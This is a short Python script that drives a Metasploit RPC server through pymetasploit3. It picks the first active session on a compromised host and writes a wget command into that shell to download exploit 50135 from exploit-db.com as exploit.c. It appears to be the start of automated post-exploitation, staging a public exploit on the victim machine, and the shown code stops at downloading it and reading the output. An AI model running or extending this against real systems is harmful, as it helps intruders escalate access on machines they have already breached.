from pymetasploit3.msfrpc import MsfRpcClient
import time
import os


abs_path = os.path.abspath("resources/50135.c")
print(abs_path)



client = MsfRpcClient('1234')

print("Sessions available: ")
for s in client.sessions.list.keys():
    print(s)
    
shell = client.sessions.session(list(client.sessions.list.keys())[0])

# Write to the shell
# shell.write('whoami')
shell.write('wget https://www.exploit-db.com/download/50135 -O exploit.c')
# Print the output

print(shell.read())